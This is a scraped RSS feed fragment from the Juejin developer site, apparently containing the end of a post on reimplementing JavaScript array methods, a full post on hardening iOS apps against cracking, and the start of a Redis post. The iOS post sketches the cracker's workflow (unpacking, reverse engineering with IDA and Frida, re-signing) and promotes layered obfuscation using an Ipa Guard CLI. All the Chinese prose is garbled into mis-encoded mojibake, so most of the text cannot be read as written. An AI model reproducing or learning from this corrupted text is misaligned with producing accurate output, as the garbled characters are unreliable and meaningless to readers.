<span class="hljs-comment">// æŒ‰åˆ†æ•°é™åºæ’åˆ—</span>
</code></pre>
<h4 data-id="heading-15">äº”ã€æ€»ç»“</h4>
<h5 data-id="heading-16">5.1 å®ç°è¦ç‚¹æ€»ç»“</h5>
<ol>
<li><strong>è¾“å…¥éªŒè¯:</strong> å§‹ç»ˆæ£€æŸ¥<code>this</code>æ˜¯å¦ä¸º<code>null</code>æˆ–<code>undefined</code>, ä»¥åŠå›è°ƒå‡½æ•°æ˜¯å¦ä¸ºå‡½æ•°ç±»å‹</li>
<li><strong>ç¨€ç–æ•°ç»„å¤„ç†:</strong> ä½¿ç”¨<code>in</code>æ“ä½œç¬¦æ£€æŸ¥ç´¢å¼•æ˜¯å¦å­˜åœ¨</li>
<li><strong>ç±»å‹å®‰å…¨:</strong> ä½¿ç”¨<code>&gt;&gt;&gt;0</code>ç¡®ä¿é•¿åº¦ä¸ºéè´Ÿæ•´æ•°</li>
<li><strong>æ€§èƒ½è€ƒè™‘:</strong></li>
</ol>
<ul>
<li>é¿å…ä¸å¿…è¦çš„æ•°ç»„æ‹·è´</li>
<li>ä½¿ç”¨é€‚å½“çš„ç®—æ³•(å¦‚å¿«é€Ÿæ’åºå¯¹äºsortæ–¹æ³•)</li>
<li>æ³¨æ„é€’å½’æ·±åº¦(ç‰¹åˆ«æ˜¯å¯¹äºflatæ–¹æ³•)</li>
</ul>
<ol start="5">
<li><strong>ä¸åŸç”Ÿæ–¹æ³•å·®å¼‚:</strong></li>
</ol>
<ul>
<li>æˆ‘ä»¬çš„å®ç°åœ¨æŸäº›è¾¹ç¼˜æƒ…å†µä¸‹å¯èƒ½ä¸åŸç”Ÿæ–¹æ³•ç•¥æœ‰ä¸åŒ</li>
<li>åŸç”Ÿæ–¹æ³•é€šå¸¸æœ‰æ›´å¥½çš„æ€§èƒ½å’Œå†…å­˜ç®¡ç†</li>
</ul>
<h5 data-id="heading-17">5.2 å®é™…åº”ç”¨åœºæ™¯</h5>
<ol>
<li><strong>æ•°æ®å¤„ç†:</strong> <code>map</code>ã€<code>filter</code>ã€<code>reduce</code>æ˜¯æ•°æ®å¤„ç†çš„ä¸‰ä»¶å¥—</li>
<li><strong>æœç´¢åŠŸèƒ½:</strong> <code>find</code>ã€<code>findIndex</code>ç”¨äºæ•°æ®æ£€ç´¢</li>
<li><strong>è¡¨å•éªŒè¯:</strong> <code>some</code>ã€<code>every</code>ç”¨äºéªŒè¯å¤šä¸ªè¾“å…¥</li>
<li><strong>çŠ¶æ€ç®¡ç†:</strong> <code>flat</code>ã€<code>flatMap</code>åœ¨å¤„ç†åµŒå¥—çŠ¶æ€æ—¶ç‰¹åˆ«æœ‰ç”¨</li>
<li><strong>æ•°æ®å±•ç¤º:</strong> <code>sort</code>ç”¨äºæ•°æ®æ’åº</li>
</ol>
<p>é€šè¿‡æ‰‹åŠ¨å®ç°è¿™äº›æ ¸å¿ƒæ•°ç»„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¸ä»…åŠ æ·±äº†å¯¹JavaScriptæ•°ç»„æ“ä½œçš„ç†è§£ï¼Œè¿˜æŒæ¡äº†å‡½æ•°å¼ç¼–ç¨‹çš„æ ¸å¿ƒæ¦‚å¿µã€‚</p>
<p>è®°ä½ï¼šåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä»ç„¶å»ºè®®ä½¿ç”¨åŸç”Ÿæ•°ç»„æ–¹æ³•ï¼Œå› ä¸ºå®ƒä»¬ç»è¿‡äº†å……åˆ†ä¼˜åŒ–å’Œæµ‹è¯•ã€‚ä½†ç†è§£è¿™äº›æ–¹æ³•çš„å®ç°åŸç†ï¼Œå°†ä½¿ä½ æˆä¸ºä¸€ä¸ªæ›´å‡ºè‰²çš„JavaScriptå¼€å‘è€…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS åº”ç”¨å¦‚ä½•é˜²æ­¢ç ´è§£ï¼Ÿä»é€†å‘é“¾è·¯è¿˜åŸæ”»å‡»è€…è§†è§’ï¼Œæ„å»ºå®Œæ•´çš„åç ´è§£å·¥ç¨‹å®è·µä½“ç³»]]></title>    <link>https://juejin.cn/post/7581669438576492580</link>    <guid>https://juejin.cn/post/7581669438576492580</guid>    <pubDate>2025-12-09T09:20:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581669438576492580" data-draft-id="7581428845683818539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS åº”ç”¨å¦‚ä½•é˜²æ­¢ç ´è§£ï¼Ÿä»é€†å‘é“¾è·¯è¿˜åŸæ”»å‡»è€…è§†è§’ï¼Œæ„å»ºå®Œæ•´çš„åç ´è§£å·¥ç¨‹å®è·µä½“ç³»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T09:20:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aiopencode"/> <meta itemprop="url" content="https://juejin.cn/user/1898230261493865"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS åº”ç”¨å¦‚ä½•é˜²æ­¢ç ´è§£ï¼Ÿä»é€†å‘é“¾è·¯è¿˜åŸæ”»å‡»è€…è§†è§’ï¼Œæ„å»ºå®Œæ•´çš„åç ´è§£å·¥ç¨‹å®è·µä½“ç³»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1898230261493865/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aiopencode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:20:04.000Z" title="Tue Dec 09 2025 09:20:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è°ˆâ€œiOS é˜²ç ´è§£â€ï¼Œå¾ˆå¤šå›¢é˜Ÿç¬¬ä¸€ååº”æ˜¯ï¼š</p>
<ul>
<li>æ··æ·†ä¸€ä¸‹ï¼Ÿ</li>
<li>æ³¨å…¥é˜²è°ƒè¯•ï¼Ÿ</li>
<li>æ£€æµ‹è¶Šç‹±ï¼Ÿ</li>
</ul>
<p>ä½†ç°å®è¿œæ¯”è¿™äº›å¤æ‚ã€‚</p>
<p>çœŸæ­£çš„ç ´è§£è¡Œä¸ºå¾€å¾€ä¸æ˜¯ä¸€ä¸ªåŠ¨ä½œï¼Œè€Œæ˜¯ä¸€æ¡å®Œæ•´çš„æ”»å‡»é“¾è·¯ï¼š</p>
<p><strong>è§£åŒ… â†’ åˆ†æ â†’ ä¿®æ”¹ â†’ é‡ç­¾å â†’ è¿è¡ŒéªŒè¯ â†’ æ‰©æ•£åˆ†å‘</strong></p>
<p>è¿™æ„å‘³ç€ï¼š</p>
<blockquote>
<p><strong>åªæœ‰æ‹†è§£æ•´ä¸ªç ´è§£é“¾è·¯ï¼Œå¹¶åœ¨æ¯ä¸ªç¯èŠ‚éƒ¨ç½²å¯¹åº”çš„é˜²æŠ¤ç­–ç•¥ï¼Œæ‰èƒ½çœŸæ­£åšåˆ°æœ‰æ•ˆçš„â€œé˜²ç ´è§£â€ã€‚</strong></p>
</blockquote>
<p>æœ¬æ–‡å°†å®Œå…¨ç«™åœ¨â€œæ”»å‡»è€…è§†è§’â€æ‹†åˆ†ç ´è§£æµç¨‹ï¼Œå¹¶è®¾è®¡ä¸€å¥—å¯¹åº”çš„å·¥ç¨‹åŒ–é˜²æŠ¤ä½“ç³»ï¼Œè®©ä½ çš„ iOS App åœ¨æ•´ä¸ªæ”»å‡»è·¯å¾„ä¸Šéƒ½å…·å¤‡é˜»æ–­èƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ”»å‡»è€…ç ´è§£ iOS åº”ç”¨çš„çœŸå®æµç¨‹ï¼ˆé“¾è·¯åŒ–è§†è§’ï¼‰</h2>
<p>ä¸ç†è§£æ”»å‡»è€…ï¼Œå°±æ— æ³•è®¾è®¡é˜²æŠ¤ç­–ç•¥ã€‚</p>
<p>ä¸‹é¢æ˜¯å¸¸è§ç ´è§£æµç¨‹ï¼š</p>
<hr/>
<h2 data-id="heading-1"><strong>Step 1ï¼šå¯¼å‡º IPA</strong></h2>
<p>æ¥æºå¯èƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>App Store ä¸‹è½½åŒ…</li>
<li>ä¼ä¸šåˆ†å‘åŒ…</li>
<li>æ¸ é“åŒ…</li>
<li>ä¸­é—´ä¼ è¾“æ³„éœ²</li>
</ul>
<hr/>
<h2 data-id="heading-2"><strong>Step 2ï¼šè§£åŒ…ä¸æš´éœ²èµ„æº</strong></h2>
<p>æ”»å‡»è€…è§£å‹ IPA åä¼šçœ‹åˆ°å®Œæ•´çš„ï¼š</p>
<ul>
<li>JSON / JS / H5</li>
<li>é…ç½®æ–‡ä»¶</li>
<li>å›¾ç‰‡ / åŠ¨ç”» / å£°éŸ³èµ„æº</li>
<li>Swift/ObjC ç¬¦å·</li>
<li>Framework</li>
</ul>
<hr/>
<h2 data-id="heading-3"><strong>Step 3ï¼šé€†å‘åˆ†æä¸šåŠ¡é€»è¾‘</strong></h2>
<p>å·¥å…·åŒ…æ‹¬ï¼š</p>
<ul>
<li>class-dump / swift-dumpï¼ˆå¯¼å‡ºç¬¦å·ï¼‰</li>
<li>Hopper / IDAï¼ˆåæ±‡ç¼– / åç¼–è¯‘ï¼‰</li>
<li>Fridaï¼ˆåŠ¨æ€ Hookï¼‰</li>
<li>MobSFï¼ˆé™æ€æ‰«æï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-4"><strong>Step 4ï¼šä¿®æ”¹é€»è¾‘æˆ–èµ„æº</strong></h2>
<p>å¸¸è§ç ´è§£æ‰‹æ³•ï¼š</p>
<ul>
<li>æ›¿æ¢ jsonï¼ˆå¼€å…³ã€é…ç½®ã€æ”¯ä»˜å‚æ•°ï¼‰</li>
<li>ä¿®æ”¹ jsï¼ˆæ ¡éªŒé€»è¾‘ã€è·³è½¬é€»è¾‘ï¼‰</li>
<li>æ›¿æ¢ H5 é¡µé¢</li>
<li>æ³¨å…¥è„šæœ¬</li>
<li>æ›¿æ¢èµ„æºæ–‡ä»¶ï¼ˆUIã€å›¾ç‰‡ï¼‰</li>
<li>Patch é€»è¾‘æŒ‡ä»¤</li>
<li>æ³¨å…¥è‡ªå®šä¹‰åŠ¨æ€åº“</li>
</ul>
<hr/>
<h2 data-id="heading-5"><strong>Step 5ï¼šé‡ç­¾ IPA</strong></h2>
<p>ä½¿ç”¨ kxsignã€iOS App Signer ç­‰å·¥å…·å³å¯å®Œæˆã€‚</p>
<hr/>
<h2 data-id="heading-6"><strong>Step 6ï¼šè¿è¡ŒéªŒè¯å¹¶ä¼ æ’­</strong></h2>
<p>æ”»å‡»è€…æµ‹è¯•åŠŸèƒ½æ— è¯¯åï¼š</p>
<ul>
<li>ç§ä¸‹åˆ†å‘</li>
<li>ä¸Šä¼ ç ´è§£ç½‘ç«™</li>
<li>ä½œä¸ºå¤–æŒ‚åŒ…ä¼ æ’­</li>
<li>ç”šè‡³ç”¨äºäºŒæ¬¡å¼€å‘</li>
<li>ç”¨äºå¹¿å‘Šæµé‡åŠ«æŒ</li>
</ul>
<hr/>
<p>ç ´è§£é“¾è·¯åˆ°è¿™é‡Œæ‰ç®—å®Œæˆã€‚</p>
<p>å¦‚æœä½ çš„ App åœ¨é“¾è·¯ä¸­ä»»æ„ç¯èŠ‚è¢«é˜»æ–­ï¼Œæ”»å‡»æˆåŠŸç‡éƒ½ä¼šå¤§å¹…é™ä½ã€‚</p>
<hr/>
<h2 data-id="heading-7">äºŒã€å¦‚ä½•ä»é“¾è·¯å±‚é¢æ„å»ºâ€œé˜²ç ´è§£ä½“ç³»â€ï¼Ÿ</h2>
<p>æˆ‘ä»¬æŒ‰ç…§æ”»å‡»é“¾è·¯é€æ­¥ååˆ¶ï¼Œè€Œéå•ç‚¹é˜²å¾¡ã€‚</p>
<hr/>
<h2 data-id="heading-8">ç¬¬ä¸€å±‚ï¼šå‡å°‘å¤–éƒ¨å¯è¯»ä¿¡æ¯ï¼ˆç¬¦å·ä¿æŠ¤ï¼‰</h2>
<h3 data-id="heading-9">å·¥å…·çŸ©é˜µï¼š</h3>
<ul>
<li><strong>Ipa Guard CLIï¼ˆæ— éœ€æºç å³å¯æ··æ·† ObjC/Swift ç¬¦å·ï¼‰</strong></li>
<li>Swift Shieldï¼ˆæºç çº§ Swift æ··æ·†ï¼‰</li>
<li>obfuscator-llvmï¼ˆé«˜çº§æ··æ·†ï¼Œéœ€æºç ï¼‰</li>
</ul>
<p>æ”»å‡»ç›®æ ‡ï¼š</p>
<ul>
<li>å»æ‰æ¸…æ™°ç±»å/æ–¹æ³•å</li>
<li>åˆ‡æ–­é€†å‘è€…çš„â€œé˜…è¯»å…¥å£â€</li>
<li>å¢åŠ  Hook éš¾åº¦</li>
</ul>
<p>ç¤ºä¾‹æµç¨‹ï¼ˆIpa Guard CLIï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse app.ipa -o sym.json
ipaguard_cli protect app.ipa -c sym.json -o mixed.ipa --email dev@team.com
</code></pre>
<p>Swift/ObjC å±‚ç¬¦å·è¢«æ›¿æ¢åï¼Œé€†å‘è€…å‡ ä¹æ— æ³•é€šè¿‡ç¬¦å·æ‰¾åˆ°å…³é”®é€»è¾‘ã€‚</p>
<hr/>
<h2 data-id="heading-10">ç¬¬äºŒå±‚ï¼šèµ„æºçº§é˜²ç¯¡æ”¹ï¼ˆç ´è§£æˆæœ¬æœ€é«˜çš„ç¯èŠ‚ï¼‰</h2>
<p>èµ„æºæ–‡ä»¶æ˜¯ç ´è§£è€…æœ€å¸¸ä¿®æ”¹çš„å¯¹è±¡ã€‚</p>
<h2 data-id="heading-11">ä¿æŠ¤ç­–ç•¥åŒ…æ‹¬ï¼š</h2>
<ul>
<li>æ”¹åèµ„æºæ–‡ä»¶</li>
<li>æ‰°åŠ¨è·¯å¾„ç»“æ„</li>
<li>ä¿®æ”¹ MD5ï¼ˆé˜²æ­¢ç›´æ¥æ›¿æ¢ï¼‰</li>
<li>æ··æ·† JSï¼ˆH5/RN/App å†…åµŒè„šæœ¬ï¼‰</li>
<li>åŠ å¯†å…³é”®é…ç½®</li>
</ul>
<h3 data-id="heading-12">å·¥å…·çŸ©é˜µï¼š</h3>
<ul>
<li><strong>Ipa Guard CLIï¼ˆèµ„æºè·¯å¾„æ··æ·†ï¼‹MD5 æ‰°åŠ¨ï¼‰</strong></li>
<li>JS Obfuscatorï¼ˆå‰ç«¯è„šæœ¬æ··æ·†ï¼‰</li>
<li>å‰ç«¯æ„å»ºé“¾å·¥å…·ï¼ˆå‹ç¼©/åˆå¹¶èµ„æºï¼‰</li>
</ul>
<p>ç¤ºä¾‹ï¼ˆèµ„æºæ··æ·†ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect app.ipa -c sym.json --image --js -o protected.ipa
</code></pre>
<p>æ•ˆæœï¼š</p>
<ul>
<li>JSON / JS / H5 çš„æ–‡ä»¶åå…¨éƒ¨éšæœºåŒ–</li>
<li>è·¯å¾„å½»åº•è¢«æ‰“æ•£</li>
<li>èµ„æºæ›¿æ¢å°†å¯¼è‡´ App å¯åŠ¨å¤±è´¥</li>
<li>æ— æ³•é€šè¿‡ç®€å•æ›¿æ¢å®Œæˆç ´è§£</li>
</ul>
<p>è¿™æ˜¯ç›®å‰é˜²ç ´è§£ä¸­æœ€æœ‰æ•ˆçš„æ‰‹æ®µä¹‹ä¸€ã€‚</p>
<hr/>
<h2 data-id="heading-13">ç¬¬ä¸‰å±‚ï¼šé˜²æ­¢äºŒæ¬¡æ‰“åŒ…ä¸é‡ç­¾åæ»¥ç”¨</h2>
<p>æ”»å‡»è€…é€šå¸¸ä¼šä¿®æ”¹ IPA å†é‡ç­¾åã€‚</p>
<h2 data-id="heading-14">ç­–ç•¥ï¼š</h2>
<ul>
<li>åœ¨ App å†…åŠ å…¥å®Œæ•´æ€§æ ¡éªŒ</li>
<li>æ ¡éªŒèµ„æºå’Œæ–‡ä»¶ç»“æ„</li>
<li>é˜»æ­¢è¢«ä¿®æ”¹çš„åŒ…è¿è¡Œ</li>
</ul>
<h3 data-id="heading-15">å·¥å…·çŸ©é˜µï¼š</h3>
<ul>
<li>å†…éƒ¨è‡ªå®šä¹‰å®Œæ•´æ€§æ£€æµ‹ä»£ç </li>
<li>Ipa Guard èµ„æº MD5 æ‰°åŠ¨ï¼ˆå¢å¼ºè¿™ä¸€å±‚ï¼‰</li>
<li>kxsignï¼ˆç”¨äºå†…éƒ¨åŠ å›ºåçš„éªŒè¯ï¼Œä¸æ˜¯é˜²æ”»å‡»å·¥å…·ï¼‰</li>
</ul>
<p>è¿™å±‚åšå¾—å¥½ï¼Œæ”»å‡»è€…å³ä½¿é‡ç­¾æˆåŠŸï¼ŒApp ä¹Ÿæ— æ³•æ­£å¸¸è¿è¡Œã€‚</p>
<hr/>
<h2 data-id="heading-16">ç¬¬å››å±‚ï¼šåŠ¨æ€è°ƒè¯•å¯¹æŠ—ï¼ˆè¿è¡Œæ—¶ç ´è§£ï¼‰</h2>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>è®© Frida / Cycript / MonkeyDev ç­‰å·¥å…·æ›´éš¾æ’æ¡©</li>
<li>éšè—å…³é”®è°ƒç”¨ç‚¹</li>
<li>åˆ‡æ–­è¿è¡Œæ—¶å¯è§‚å¯Ÿæ€§</li>
</ul>
<h3 data-id="heading-17">å·¥å…·çŸ©é˜µï¼š</h3>
<ul>
<li>Anti-Frida ä»£ç ï¼ˆå†…éƒ¨æ³¨å…¥ï¼‰</li>
<li>ç¬¦å·æ··æ·†ï¼ˆIpa Guardï¼‰æå‡ Hook éš¾åº¦</li>
<li>å®Œæ•´æ€§æ£€æµ‹é¿å…æ’æ¡©ä¿®æ”¹</li>
</ul>
<p>ç¬¦å·æ··æ·†å¯¹åŠ¨æ€é˜²æŠ¤æå…¶é‡è¦ï¼Œå› ä¸º Frida Hook çš„å…¥å£é€šå¸¸é â€œç¬¦å·å®šä½â€ã€‚</p>
<hr/>
<h2 data-id="heading-18">ç¬¬äº”å±‚ï¼šé€†å‘å¯¹æŠ—éªŒè¯ï¼ˆæ£€éªŒé˜²ç ´è§£æ•ˆæœï¼‰</h2>
<h3 data-id="heading-19">å·¥å…·çŸ©é˜µï¼š</h3>

























<table><thead><tr><th>å·¥å…·</th><th>æ£€æŸ¥å†…å®¹</th></tr></thead><tbody><tr><td>Hopper / IDA</td><td>ç¬¦å·æ˜¯å¦ä»å¯è¯»</td></tr><tr><td>Frida</td><td>æ˜¯å¦è¿˜èƒ½æ‰¾åˆ°å…¥å£ Hook</td></tr><tr><td>æ–‡ä»¶æ›¿æ¢å®éªŒ</td><td>èµ„æºä¿æŠ¤æ˜¯å¦æœ‰æ•ˆ</td></tr><tr><td>MobSF</td><td>é£é™©ç‚¹æ‰«æ</td></tr></tbody></table>
<p>è¿™ä¸€æ­¥ç¡®ä¿åŠ å›ºçœŸæ­£ç”Ÿæ•ˆã€‚</p>
<hr/>
<h2 data-id="heading-20">ä¸‰ã€æ•´å¥—â€œiOS é˜²ç ´è§£å·¥ç¨‹æµç¨‹â€å¯ä»¥è‡ªåŠ¨åŒ–</h2>
<p>æœ€ç»ˆå½¢æˆå¯æ¥å…¥ CI/CD çš„æµç¨‹ï¼š</p>
<hr/>
<h2 data-id="heading-21"><strong>â‘  æ„å»ºå¹²å‡€ IPA</strong></h2>
<hr/>
<h2 data-id="heading-22"><strong>â‘¡ Ipa Guard CLI æå–ç¬¦å·ä¸èµ„æºä¿¡æ¯</strong></h2>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse app.ipa -o sym.json
</code></pre>
<hr/>
<h2 data-id="heading-23"><strong>â‘¢ æ··æ·†ç­–ç•¥ç”Ÿæˆï¼ˆè„šæœ¬åŒ–å¤„ç† sym.jsonï¼‰</strong></h2>
<hr/>
<h2 data-id="heading-24"><strong>â‘£ IPA å±‚æ··æ·†ä¸èµ„æºä¿æŠ¤</strong></h2>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect app.ipa -c sym.json --js --image -o encrypted.ipa
</code></pre>
<hr/>
<h2 data-id="heading-25"><strong>â‘¤ ä½¿ç”¨ kxsign é‡ç­¾å¹¶è‡ªåŠ¨å®‰è£…æµ‹è¯•</strong></h2>
<p>éªŒè¯ï¼š</p>
<ul>
<li>æ˜¯å¦æ­£å¸¸è¿è¡Œ</li>
<li>æ˜¯å¦å‡ºç°èµ„æºåŠ è½½å¼‚å¸¸</li>
<li>æ˜¯å¦å½±å“çƒ­æ›´æ–°/Hybrid/RN/Flutter</li>
</ul>
<h2 data-id="heading-26"><strong>â‘¥ é€†å‘å¯¹æŠ—æµ‹è¯•ï¼ˆHopper + Fridaï¼‰</strong></h2>
<h2 data-id="heading-27"><strong>â‘¦ æ˜ å°„æ–‡ä»¶æ²»ç†ï¼ˆå´©æºƒå¯è¿½è¸ªï¼‰</strong></h2>
<hr/>
<p>è¿™å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å·¥ç¨‹åŒ–â€œé˜²ç ´è§£ä½“ç³»â€ã€‚</p>
<hr/>
<h2 data-id="heading-28">iOS é˜²ç ´è§£å¿…é¡»ä»æ”»å‡»é“¾è·¯å‡ºå‘ï¼Œè€Œä¸æ˜¯å †å æŸä¸€ä¸ªå·¥å…·</h2>
<p>æœ€ç»ˆç»„åˆå¦‚ä¸‹ï¼š</p>
<hr/>
<h2 data-id="heading-29"><strong>ç¬¦å·ä¿æŠ¤å±‚</strong></h2>
<p>Swift Shieldã€obfuscator-llvmã€<strong>Ipa Guard CLIï¼ˆæ— éœ€æºç ï¼‰</strong></p>
<h2 data-id="heading-30"><strong>èµ„æºé˜²ç¯¡æ”¹å±‚</strong></h2>
<p>Ipa Guard çš„èµ„æºæ‰°åŠ¨ + MD5 ä¿®æ”¹ã€JS æ··æ·†å·¥å…·</p>
<h2 data-id="heading-31"><strong>åŠ¨æ€é˜²å¾¡å±‚</strong></h2>
<p>Anti-Frida æ³¨å…¥ã€ç¬¦å·æ··æ·†å¯¹æŠ— Hook</p>
<h2 data-id="heading-32"><strong>é€†å‘éªŒè¯å±‚</strong></h2>
<p>Hopperã€Fridaã€MobSF</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[redis ä»€ä¹ˆæƒ…å†µä¼šè‡ªåŠ¨åˆ é™¤key]]></title>    <link>https://juejin.cn/post/7581669438576476196</link>    <guid>https://juejin.cn/post/7581669438576476196</guid>    <pubDate>2025-12-09T09:18:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581669438576476196" data-draft-id="7581428845683802155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="redis ä»€ä¹ˆæƒ…å†µä¼šè‡ªåŠ¨åˆ é™¤key"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T09:18:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" 